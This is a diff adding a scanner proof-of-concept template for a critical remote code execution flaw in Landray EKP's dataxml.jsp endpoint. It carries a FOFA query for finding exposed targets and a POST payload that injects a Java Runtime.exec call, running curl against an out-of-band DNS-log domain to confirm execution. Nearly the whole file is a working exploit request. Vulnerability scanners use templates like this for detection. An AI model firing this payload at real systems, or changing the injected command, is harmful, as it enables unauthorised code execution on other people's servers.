@@ -1,0 +1,20 @@
+id: poc-yaml-landray-ekp-dataxml-script-rce
+info:
+  name: 蓝凌EKP common/dataxml.jsp 远程代码执行漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  finger: 蓝凌EKP
+  fofa: app="Landray-OA系统"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /ekp/sys/common/dataxml.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: s_bean=sysFormulaValidate&script=Runtime.getRuntime().exec("curl+{{.reverseDomain}}");&service=sysTagTagsService
+  expression: "status_code == 200 && \nreverse.Verify()\n"
+transport: http
